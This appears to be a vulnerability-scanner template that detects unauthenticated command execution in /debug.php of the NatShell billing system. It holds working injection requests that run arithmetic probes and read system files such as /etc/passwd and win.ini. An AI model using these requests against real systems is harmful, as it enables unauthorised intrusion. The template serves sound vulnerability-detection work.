name: yaml-poc-natshell-ns_g50-other-CT-529723
binding: b0bda385-578b-4c6e-a18a-ee192901b814
detail:
    author: luhan.xu
    links:
        - https://cn-sec.com/archives/1345701.html
    vulnerability:
        id: 19f270f4-c088-42cc-9778-f4cb1d5d919b
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000000, 900000000)
    s2: randomInt(10000, 90000)
rules:
    check1:
        request:
            cache: true
            method: GET
            path: /login.php
        expression: response.title_string.contains("蓝海卓越计费管理系统")
    check2:
        request:
            cache: true
            method: GET
            path: /login.php
        expression: response.body_string.contains("<h1>蓝海卓越计费管理系统</h1>")
    r0:
        request:
            cache: true
            method: POST
            path: /debug.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                cmd=set /A {{s1}}-{{s2}}
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
    r1:
        request:
            cache: true
            method: POST
            path: /debug.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                cmd=type c:/windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r2:
        request:
            cache: true
            method: POST
            path: /debug.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                cmd=expr {{s1}} - {{s2}}
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
    r3:
        request:
            cache: true
            method: POST
            path: /debug.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                cmd=echo {{s1}}-{{s2}}|bc
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
    r4:
        request:
            cache: true
            method: POST
            path: /debug.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                cmd=cat /etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: (check1() || check2()) && (r0() || r1() || r2() || r3() || r4())
